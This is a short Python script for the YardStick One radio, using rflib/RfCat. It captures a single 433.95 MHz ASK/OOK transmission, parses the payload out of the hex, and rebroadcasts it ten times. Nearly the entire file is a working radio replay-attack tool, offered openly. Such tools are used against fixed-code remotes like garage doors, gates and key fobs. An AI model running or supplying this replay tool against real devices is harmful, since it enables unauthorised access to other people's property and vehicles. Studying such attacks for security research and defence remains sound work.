 #—————YardStick_InstantReplay_SimpleVersion.py ----------#
# @Ficti0n
# http://consolecowboys.com 


from rflib import *
import time
import re
import bitstring

print("Listening for them signals in ASK")
d = RfCat()
d.setFreq(433950000)
d.setMdmModulation(MOD_ASK_OOK)
d.setMdmDRate(4800)
d.setMaxPower()
d.lowball()

#-----------Start Capture 1 Transmission ----------#
capture = ""
while (1):
    try:
        y, z = d.RFrecv()
        capture = y.encode('hex')
        print capture
        
    except ChipconUsbTimeoutException: 
        pass
    if capture:
        break

#Parse Hex from the capture by reducing 0's
payloads = re.split ('0000*', capture)
print payloads

#----------Start Parse and Create Payload---------#
for payload in payloads: 
    
    formated = ""
    if (len(payload) > 6) and (len(payload) % 2 == 0):
        print "Currently being formatted to binary: " + payload 
        binary = bin(int(payload,16))[2:]
        print binary
        print "Converting binary to bytes: "
        formatted = bitstring.BitArray(bin=(binary)).tobytes()
    else:
        continue

#------------Send Transmission--------------------#
    time.sleep(2)
    print "Sending bytes with padding"
    d.RFxmit((formatted+"\x00\x00\x00\x00\x00\x00")*10)
    print 'Transmission Complete'


